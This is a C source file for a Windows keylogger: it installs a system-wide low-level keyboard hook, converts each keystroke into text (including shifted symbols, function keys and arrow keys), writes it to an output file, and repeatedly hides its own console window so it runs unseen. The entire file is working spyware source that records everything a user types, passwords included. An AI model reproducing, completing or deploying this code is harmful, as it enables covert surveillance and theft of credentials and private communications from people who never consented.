#include "keylogger.h"

/*
Keylogger function
*/

extern FILE * keylogger_output_stream;
bool shift = false, caps = false;
int keysPressed = 0;
HHOOK h_keyboard_hookook;

// Hook procedure to intercept the keyboard
LRESULT CALLBACK hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *hooked_key = (KBDLLHOOKSTRUCT *)lParam;
	char *str = "[X]";
	if ((nCode >= HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)))
	{
		if ((wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP)) {
			str = translate(hooked_key->vkCode, true);
		}
		else if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) {
			str = translate(hooked_key->vkCode, false);
		}
		if (str)
			fprintf(keylogger_output_stream, "%s", str);
		keysPressed++;
		if (keysPressed >= KEYLOGGER_BUF_SIZE) {
			fprintf(keylogger_output_stream, "\n");
			fflush(keylogger_output_stream);
			keysPressed = 0;
		}
	}
	return CallNextHookEx(h_keyboard_hookook, nCode, wParam, lParam);
}

// funtion tha translate pressed key to an understandable data
char * translate(int vk, bool up)
{
	if (up) {
		if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
			shift = false;
		return NULL;
	}
	else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) {
		shift = true;
		return NULL;
	}
	char *buf = (char*)malloc(KEYLOGGER_BUF_SIZE);
	memset(buf, 0, KEYLOGGER_BUF_SIZE);
	if (vk < 0x29) {
		switch (vk) {
		case 0x08: strncpy(buf, "[BS]", KEYLOGGER_BUF_SIZE); break;
		case 0x09: strncpy(buf, "[TAB]", KEYLOGGER_BUF_SIZE); break;
		case 0x0d: strncpy(buf, "[CR]", KEYLOGGER_BUF_SIZE); break;
		case 0x14: caps ^= 1; break;
		case 0x20: buf[0] = ' '; break;
		case 0x25: strncpy(buf, "[LT]", KEYLOGGER_BUF_SIZE); break;
		case 0x26: strncpy(buf, "[UP]", KEYLOGGER_BUF_SIZE); break;
		case 0x27: strncpy(buf, "[RT]", KEYLOGGER_BUF_SIZE); break;
		case 0x28: strncpy(buf, "[DN]", KEYLOGGER_BUF_SIZE); break;
		}
		return buf;
	}
	if (vk > 0x69 && vk < 0x70) {
		buf[0] = (char)(vk - 0x40);
	}
	else if (vk > 0x6f && vk < 0x88) {
		sprintf(buf, "[F%d]", vk - 0x6f);
	}
	else if (isalpha(vk)) {
		if (!caps)
			if (shift) { buf[0] = (char)(toupper(vk)); }
			else { buf[0] = (char)(tolower(vk)); }
		else
			if (!shift) { buf[0] = (char)(toupper(vk)); }
			else { buf[0] = (char)(tolower(vk)); }
	}
	else {
		//TODO : convert to AZERTY keyboard
		switch (vk) {
		case '1': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '!'; } break;
		case '2': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '@'; } break;
		case '3': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '#'; } break;
		case '4': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '$'; } break;
		case '5': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '%'; } break;
		case '6': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '^'; } break;
		case '7': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '&'; } break;
		case '8': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '*'; } break;
		case '9': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '('; } break;
		case '0': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = ')'; } break;
		case 0xba: if (!shift) { buf[0] = ';'; }
				   else { buf[0] = ':'; } break;
		case 0xbb: if (!shift) { buf[0] = '='; }
				   else { buf[0] = '+'; } break;
		case 0xbc: if (!shift) { buf[0] = ','; }
				   else { buf[0] = '<'; } break;
		case 0xbd: if (!shift) { buf[0] = '-'; }
				   else { buf[0] = '_'; } break;
		case 0xbe: if (!shift) { buf[0] = '.'; }
				   else { buf[0] = '>'; } break;
		case 0xbf: if (!shift) { buf[0] = '/'; }
				   else { buf[0] = '?'; } break;
		case 0xc0: if (!shift) { buf[0] = '`'; }
				   else { buf[0] = '~'; } break;
		case 0xdb: if (!shift) { buf[0] = '['; }
				   else { buf[0] = '{'; } break;
		case 0xdc: if (!shift) { buf[0] = '\\'; }
				   else { buf[0] = '|'; } break;
		case 0xdd: if (!shift) { buf[0] = ']'; }
				   else { buf[0] = '}'; } break;
		case 0xde: if (!shift) { buf[0] = '\''; }
				   else { buf[0] = '\"'; } break;
		}
	}
	return buf;
}

// thread of the keylogger
DWORD WINAPI WinAPIextentionK(LPVOID param)
{
	KEYLOG keylog = *((KEYLOG *)param);
	KEYLOG *keylogs = (KEYLOG *)param;

	HINSTANCE hook_instance;
	HWND self = GetConsoleWindow();
	ShowWindow(self, SW_HIDE);

	hook_instance = GetModuleHandle(NULL);
	HOOKPROC hook_procedure = hook_keylogger;

	// 0 for dwThreadId = associated with all existing threads running in the same desktop as the calling thread
	h_keyboard_hookook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_procedure, hook_instance, 0);

	MSG message;
	while ((GetMessage(&message, NULL, 0, 0) > 0) && (keylogs->state == true))
	{
		ShowWindow(self, SW_HIDE);
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(h_keyboard_hookook);
	fflush(keylogs->outputfile_stream);
	fclose(keylogs->outputfile_stream);

	ExitThread(0);
}

